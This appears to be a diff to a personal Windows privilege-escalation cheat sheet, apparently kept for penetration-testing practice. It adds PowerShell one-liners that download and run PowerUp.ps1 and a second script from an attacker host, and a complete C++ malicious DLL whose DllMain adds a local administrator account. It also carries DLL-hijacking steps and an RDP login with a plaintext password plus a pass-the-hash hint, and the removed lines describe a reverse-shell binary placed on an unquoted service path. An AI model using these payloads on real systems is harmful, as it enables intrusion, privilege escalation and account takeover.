@@ -49,6 +49,21 @@ Get-ChildItem . -Force
 iwr -uri http://IP -outfile some.exe
 
 
+```
+
+### Helpful stuff
+
+```powershell
+
+#reboot
+
+shutdown /r /t 0
+
+# RDP into machine
+
+`xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75`
+
+# use `/pth:` for pass the hash
 
 ```
 
@@ -417,32 +432,14 @@ RABBIT HOLE: Make sure you can restart the service or machine to make changes ac
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
 
-* Or use accesschk.exe to check permissions on all directories within C:\
-
-* Example unquoted path: c:\Program Files\Unquoted Path\Some Program\bin.exe
-
 ```powershell
-# First check c:\
-accesschk.exe /accepteula -uwdq C:\
 
-#output 
-PS C:\temp> .\accesschk.exe /accepteula -uwdq "c:\"
+# any unquoted services?
+IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx:8080/PowerUp.ps1'); Invoke-AllChecks
 
+# find folders with write access
+IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx:8080/ChkUnqPath.ps1'); Test-WriteAccess -FolderPath "C:\path with some\spaces here\"
 
-  RW NT AUTHORITY\SYSTEM
-  RW BUILTIN\Administrators
-  RW NT SERVICE\TrustedInstaller
-
-# Check 'Program Files'
-
-PS C:\temp> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
-
-  RW NT AUTHORITY\SYSTEM
-  RW BUILTIN\Administrators
-  RW pc\user # Bingo! RW access for user!
-
-# Bingo! User has local access read and write rights
-# Now we can create a malicious Uquoted.exe with reverse shell in Program Files directory and exploit it by restarting the service
 ```
 
 
@@ -504,7 +501,9 @@ Now just start the service again and await reverse shell.
 
 
 
-#### Service Binary Hijacking
+#### Hijacking
+
+##### Binary
 
 1. Find running services
 
@@ -519,11 +518,14 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName,
 
 # check specific service
 
-Where-Object {$_.Name -like 'mysql'}
+# using Where-Object {$_.Name -like 'mysql'}
 
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName,StartMode | Where-Object {$_.Name -like 'service0815'}
 
 ```
+
+Alternativekly use powerups funtion `Get-ModifiableServiceFile`.
+
 2. Find writable binary 
 
 ```powershell
@@ -581,6 +583,58 @@ Get-ChildItem C:\temp\ -Recurse | Get-Acl
 2. If `AlwaysInstallElevated set to 1 in HKLM or HKCU!` then it is exploitable
 
 3. create malicious msi rev shell `-f msi` and execute it on victim
+
+##### DLL
+
+1. Identify missing DLL using procmon
+2. crorss-compile malicious dll and place in working folder
+
+```cpp
+// x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+```
+
+
+3. restart service/ reboot PC
+
+DLL is going to be searched by OS in following order.
+
+```log
+
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+```
+
 
 ### Passwords compromise
 
@@ -1060,13 +1114,5 @@ Enable-PSRemoting -SkipNetworkProfileCheck -Force
 
 winrm quickconfig -y
 
-# REBOOT THE SYSTEM
-shutdown /r
-
 ```
 
-* RDP into machine
-
-`xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75`
-
-use `/pth:` for pass the hash
